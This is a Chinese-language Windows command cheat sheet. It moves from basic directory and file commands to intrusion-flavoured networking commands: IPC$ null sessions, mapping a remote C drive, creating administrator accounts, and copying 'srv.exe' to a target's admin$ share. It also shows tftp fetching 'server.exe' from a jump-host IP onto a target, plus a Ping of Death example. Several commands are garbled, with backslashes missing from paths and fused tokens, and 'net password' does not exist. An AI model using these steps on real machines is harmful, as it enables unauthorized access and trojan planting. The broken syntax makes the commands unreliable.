## 2.目录操作

### 2.1 列出目录与查找文件

```bat
DIR [目录名或文件名] [/S] [/W] [/P] [/A]
```

| 参数 | 说明 |
| --- | --- |
| `/S` | 查找子目录 |
| `/W` | 只显示文件名 |
| `/P` | 分页显示 |
| `/A` | 显示隐藏文件 |

**示例**：查找该盘的 `format.exe` 文件并报告位置。

```bat
DIR format.exe /s
```

### 2.2 创建目录

```bat
MD [目录名]
MKDIR [目录名]
```

**示例**：创建 `HELLOWORLD` 目录。

```bat
MKDIR HELLOWORLD
```

### 2.3 切换目录

```bat
CD [目录名]
CHDIR [目录名]
```

> 可以使用**相对目录**或**绝对目录**。

| 示例 | 说明 |
| --- | --- |
| `cd AA` | 进入当前文件夹下的 `AA` 目录 |
| `cd ..` | 进入上一级目录 |
| `cd \` | 返回根目录 |
| `cd c:\windows` | 进入 `c:\windows` 文件夹 |

### 2.4 删除目录

```bat
RD [目录名]
RMDIR [目录名]
```

**示例**：删除 `HELLOWORLD` 目录。

```bat
RD HELLOWORLD
```

## 3.文件操作

### 3.1 删除目录树

```bat
rmdir [目录名] [/S] [/Q]
```

| 参数 | 说明 |
| --- | --- |
| `/S` | 删除目录树 |
| `/Q` | 安静模式，不提示确认 |

删除文件使用 `del`。

**示例**：删除 C 盘的 `qqdownload` 目录。

```bat
rmdir c:\qqdownload /s
```

### 3.2 删除文件

```bat
del [目录名或文件名] [/F] [/S] [/Q]
```

| 参数 | 说明 |
| --- | --- |
| `/F` | 删除只读文件 |
| `/S` | 删除该目录及其下的所有内容 |
| `/Q` | 删除前不确认 |

**示例**：

```bat
del c:\del /s /q
```

### 3.3 复制文件

```bat
copy [源文件或目录] [目标目录]
```

**示例**：将 D 盘 `pwin98` 的所有文件复制到 C 盘的 `presetup` 下。

```bat
copy d:\pwin98*.* c:\presetup
```

### 3.4 查看与修改文件属性

> `attrib` 可以列出或修改磁盘上的文件属性。

```bat
attrib [参数] [源文件或目录]
```

| 属性 | 含义 |
| --- | --- |
| `A` | 文档／存档 |
| `R` | 只读 |
| `H` | 隐藏 |
| `S` | 系统 |

**示例**：去掉 `io.sys` 的隐藏、只读和系统属性，再通过 `dir` 查看。

```bat
attrib -h -r -s io.sys
```

**示例**：为 `autoexec.bat` 增加上述属性。

```bat
attrib +h +r +s autoexec.bat
```

## 4.其他操作

### 4.1 IPC 连接与共享

| 命令 | 说明 |
| --- | --- |
| `net use \\IP\ipc$ "" /user:""` | 建立 IPC 空链接 |
| `net use \\IP\ipc$ "密码" /user:"用户名"` | 建立 IPC 非空链接 |
| `net use h: \\IP\ipc$ "密码" /user:"用户名"` | 直接登录后映射对方 C 盘到本地 H 盘 |
| `net use h: \\IP\ipc$` | 登录后映射对方 C 盘到本地 H 盘 |
| `net use \\IP\ipc$ /del` | 删除 IPC 链接 |
| `net use h: /del` | 删除映射到本地 H 盘的映射 |
| `net view` | 查看本地局域网内开启了哪些共享 |
| `net view ip` | 查看对方局域网内开启了哪些共享 |
| `net share` | 查看本地开启的共享 |
| `net share ipc$` | 开启 `ipc$` 共享 |
| `net share ipc$ /del` | 删除 `ipc$` 共享 |
| `net share c$ /del` | 删除 C 盘共享 |
| `net logoff` | 断开连接的共享 |

### 4.2 用户、账户与权限

| 命令 | 说明 |
| --- | --- |
| `net user 用户名 密码 /add` | 建立用户 |
| `net user guest /active:yes` | 激活 `guest` 用户 |
| `net user` | 查看有哪些用户 |
| `net user 帐户名` | 查看账户属性 |
| `net localgroup administrators 用户名 /add` | 把用户添加到管理员组，使其具有管理员权限 |
| `net user guest 12345` | 用 `guest` 用户登录后，将密码改为 `12345` |
| `net password 密码` | 更改系统登录密码 |

`cacls` 用于显示或修改 NTFS 文件的访问控制列表（ACL）。

```bat
cacls 文件名 参数
cacls 文件名
```

| 参数 | 说明 |
| --- | --- |
| `/D 用户名` | 设定拒绝某用户访问 |
| `/P 用户名:perm` | 替换指定用户的访问权限 |
| `/G 用户名:perm` | 赋予指定用户访问权限 |

| `perm` 值 | 权限 |
| --- | --- |
| `N` | 无 |
| `R` | 读取 |
| `W` | 写入 |
| `C` | 更改（写入） |
| `F` | 完全控制 |

**示例**：设定 `pub` 用户不能访问 `D:\test.txt`。

```bat
cacls D:\test.txt /D pub
```

### 4.4 网络诊断与路由

| 命令 | 说明 |
| --- | --- |
| **`netstat -a`** | 查看开启了哪些端口，常用 `netstat -an` |
| **`netstat -n`** | 查看端口的网络连接情况，常用 `netstat -an` |
| `netstat -v` | 查看正在进行的工作 |
| `netstat -p 协议名` | 查看某协议的使用情况；示例为 `netstat -p tcp/ip` |
| `netstat -s` | 查看所有协议的使用情况 |
| `nbtstat -A ip` | 对方 137—139 中有端口开放时，可查看最近登录的用户名 |
| `tracert -参数 ip` | 跟踪路由，也可使用计算机名；`-w数字` 用于设置超时间隔 |
| **`ping ip`** | 向主机发送默认大小为 32 字节的数据，也可使用域名 |
| `ipconfig` | 查看本地 IP；`/all` 显示全部配置信息 |
| `winipcfg` | 用于 Windows 95／98 查看本地 IP |
| `route print` | 显示 IP 路由，包括网络地址、子网掩码、网关地址与接口 |
| `arp` | 查看和处理 ARP 缓存 |
| `arp -a` | 显示全部 ARP 信息 |

**`ping` 参数**：

| 参数 | 说明 |
| --- | --- |
| `-l 数据包大小` | 指定数据包大小 |
| `-n 发送次数` | 指定发送次数 |
| `-t` | 持续发送 |

**示例**：

```bat
ping -t -l 65500 ip
```

持续向目标发送指定大小的数据包。Windows `ping` 的 `-l` 参数范围为 `0—65500` 字节。

> “死亡之 ping（Ping of Death）”针对早期系统，现代系统已经修复。

**地址解析对照**：

- **ARP**：将 IP 地址解析为 MAC 地址。
- **DNS**：将域名解析为 IP 地址。

### 4.5 远程登录与文件传输

| 命令 | 说明 |
| --- | --- |
| `finger username @host` | 查看最近有哪些用户登录 |
| `telnet ip 端口` | 远程登录服务器，默认端口为 `23` |
| `open ip` | Telnet 登录后的连接命令 |
| `telnet` | 在本机直接输入，进入 Telnet |
| `copy c:srv.exe ipadmin$` | 复制本地 `c:srv.exe` 到对方的 `admin` 下 |
| `copy ipadmin$svv.exe c:` | 复制对方 `admini$` 共享下的 `srv.exe` 文件到本地 C 盘 |
| `copyipadmin$*.*` | 复制对方共享下的所有文件 |
| `tftp -i 自己IP get server.exec:server.exe` | 以本机或跳板 IP 下载 `server.exe` 到目标主机 |
| `tftp -i 对方IP put c:server.exe` | 上传本地 `c:server.exe` 到对方主机 |
| `ftp ip 端口` | 上传文件或进行文件操作，默认端口为 `21` |

**传输模式**：

- `tftp -i`：以**二进制**模式传送，例如传送可执行文件；不加 `-i` 时为 ASCII 模式。
- FTP 的 `bin`：以**二进制**方式传送；默认 ASCII 模式用于文本文件。
